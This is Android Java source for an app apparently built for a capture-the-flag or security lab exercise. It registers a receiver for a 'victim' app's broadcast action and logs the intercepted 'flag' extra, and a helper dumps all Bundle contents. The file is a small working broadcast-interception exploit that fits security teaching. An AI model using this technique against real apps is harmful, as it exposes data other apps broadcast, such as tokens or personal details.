package com.example.maliciousapp;

import androidx.appcompat.app.AppCompatActivity;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        BroadcastReceiver customRec = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String flag = intent.getExtras().getString("flag");
                Log.e("flag", flag);
            }
        };

        IntentFilter intFil = new
                IntentFilter("victim.app.FLAG_ANNOUNCEMENT");
        registerReceiver(customRec, intFil);
    }

    public static String bundle2string(Bundle bundle){
        if (bundle == null) {
            return null;
        }
        String string = "Bundle{";
        for (String key : bundle.keySet()) {
            string += " " + key + " => " + bundle.get(key) + ";";
        }
        string += " }Bundle";
        return string;
    }
}